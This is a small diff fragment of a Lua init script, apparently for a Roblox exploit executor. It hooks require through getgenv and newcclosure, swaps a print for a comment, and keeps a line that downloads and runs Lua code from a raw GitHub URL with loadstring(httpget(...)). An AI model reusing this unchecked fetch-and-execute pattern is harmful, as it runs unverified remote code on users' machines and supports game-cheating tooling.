@@ -353,7 +353,5 @@ getgenv().require = newcclosure(function(v)
         return res
     end
 end)
-
+-- drawing loadstring below
 loadstring(httpget("https://raw.githubusercontent.com/PSWalloz/23ergtfb/refs/heads/main/DDD.lua"))()
-
-print("loaded init script!")
